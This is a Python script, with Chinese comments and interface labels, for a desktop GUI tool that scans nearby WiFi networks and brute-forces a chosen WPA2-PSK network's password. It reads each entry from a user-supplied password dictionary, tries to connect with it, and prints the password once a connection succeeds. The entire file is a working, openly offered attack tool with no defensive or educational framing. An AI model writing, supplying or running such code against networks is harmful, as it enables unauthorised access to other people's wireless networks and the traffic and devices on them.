import PySimpleGUI as sg
import pywifi
from pywifi import const
import time, os.path

# 设置全局默认设置
sg.set_options(font=("微软雅黑", 10))

# 定义UI布局
layout = [[sg.Text("2.选择破解的WIFI名称：")],
          [sg.Combo(values=[], key="-WIFI NAME-", size=(40, None)), sg.Button("1.查找WIFI", key="-SCAN WIFI-")],
          [sg.Text("3.选择密码字典文件：")],
          [sg.InputText(key="-KEY LIST-"), sg.FileBrowse("选择文件", target="-KEY LIST-", key="-FILE CHOOSE-")],
          [sg.Button("4.执行检查", key="-CHECK-"),
           sg.Button('5.开始破解', key="-START-", auto_size_button=False, disabled=True)],
          [sg.Output(key="-OUTPUT-", size=(54, 20))]]

# 创建Window
window = sg.Window('Window Title', layout)

# 创建网卡
wifi = pywifi.PyWiFi()
ifaces = wifi.interfaces()
iface = None
if len(ifaces) > 0:
    iface = ifaces[0]


def scan_wifi():
    """扫描附近的WIFI"""
    print("开始扫描WIFI，请稍候……")
    iface.scan()
    time.sleep(2)
    results = []
    for res in iface.scan_results():
        if len(res.ssid) > 0 and res.ssid not in results:
            results.append(res.ssid)
    window["-WIFI NAME-"].update(values=results)
    print("扫描完毕")


def check():
    """检查破解前的准备工作是否完备"""
    if iface is None:
        print("你的计算机没有网卡，请退出！")
        window["-START-"].update(disabled=True)
        return
    else:
        print("计算机网卡已选定：" + iface.name())

    wifiname = values["-WIFI NAME-"]
    if (wifiname is None) or (len(wifiname) == 0):
        print("WIFI名称不能为空")
        return
    else:
        print("WIFI名称：" + wifiname)

    keylist = values["-KEY LIST-"]
    if (keylist is None) or (len(keylist) == 0):
        print("密码字典路径不能为空")
    else:
        if os.path.exists(keylist) and os.path.isfile(keylist):
            print("密码字典路径：" + keylist)
            window["-START-"].update(disabled=False)
        else:
            print("密码字典路径不正确")


def wifi_connect(interface, wifiname, password):
    """
    尝试进行 WiFi 连接
    :param interface: 网卡对象
    :param wifiname: WiFi名称
    :param password: WiFi密码
    :return: True or False, 连接成功或者失败
    """
    if interface.status() != const.IFACE_DISCONNECTED:
        interface.disconnect()  # 断开连接
        time.sleep(0.5)

    profile = pywifi.Profile()  # 创建WiFi连接文件
    profile.ssid = wifiname  # WiFi的ssid，即wifi的名称
    profile.key = password  # WiFi密码
    profile.auth = const.AUTH_ALG_OPEN  # 开放网卡
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # WiFi的加密类型，现在一般的wifi都是wpa2psk
    profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元

    interface.remove_all_network_profiles()  # 清空profile列表
    interface.add_network_profile(profile)  # 添加profile
    interface.connect(profile)  # 连接WiFi

    time.sleep(1)
    if interface.status() == const.IFACE_CONNECTED:
        return True
    return False


def crack(wifiname, keylist):
    """
    使用密码字典的方式暴力破解 WiFi 密码
    :param wifiname: WiFi名称
    :param keylist: 密码字典
    :return: 破解出的密码
    """
    with open(keylist, "r", encoding="utf-8") as f:
        for key in f.readlines():
            key = key.strip()
            print("正在尝试密码：" + key)
            isok = wifi_connect(iface, wifiname, key)
            if isok:
                print("连接成功！WiFi：" + wifiname + " 密码：" + key)
                return key
            else:
                print("连接失败，密码错误")


# 事件处理循环
while True:
    # 调用read()显示窗口，等待用户交互
    event, values = window.read()

    # 以下就是事件处理的逻辑
    # 如果用户点击关闭窗口，就退出
    if event == sg.WINDOW_CLOSED:
        break
    # 扫描WIFI
    elif event == "-SCAN WIFI-":
        scan_wifi()
    # 执行检查
    elif event == "-CHECK-":
        check()
    # 开始破解
    elif event == "-START-":
        print("开始破解")
        crack(values["-WIFI NAME-"], values["-KEY LIST-"])

# 关闭Window
window.close()